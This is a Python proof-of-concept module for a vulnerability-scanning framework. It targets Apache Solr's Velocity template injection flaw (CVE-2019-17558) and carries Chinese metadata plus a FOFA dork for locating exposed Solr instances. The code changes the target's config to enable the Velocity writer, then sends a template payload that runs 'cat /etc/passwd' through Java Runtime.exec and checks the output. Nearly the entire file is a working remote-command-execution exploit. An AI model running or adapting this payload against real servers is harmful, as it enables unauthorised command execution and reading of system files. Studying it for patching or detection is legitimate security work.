# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import json
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)",                        # 漏洞名称
        "VulnID" : "CVE-2019-17558",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache Solr",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Apache Solr 是一个开源的搜索服务器。
            在其 5.0.0 到 8.3.1版本中，用户可以注入自定义模板，通过Velocity模板语言执行任意命令。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="Solr Admin"
            app="Apache-Solr" || app="Solr"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/solr/admin/cores?indexInfo=false&wt=json" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            core_name = list(json.loads(req0.text)["status"])[0]

            url1 = self.target + "/solr/" + core_name + "/config"
            headers["Content-Type"] = "application/json"
            set_api_data ="""
{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
"""
            req1 = requests.post(url1,data = set_api_data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req1.status_code == 200:
                url2 = self.target + "/solr/" + core_name + "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat /etc/passwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
                req2 = requests.get(url2,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if "root:/root" in req2.text:
                    vuln = [True,req2.text]

            else:
                vuln = [False,req1.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()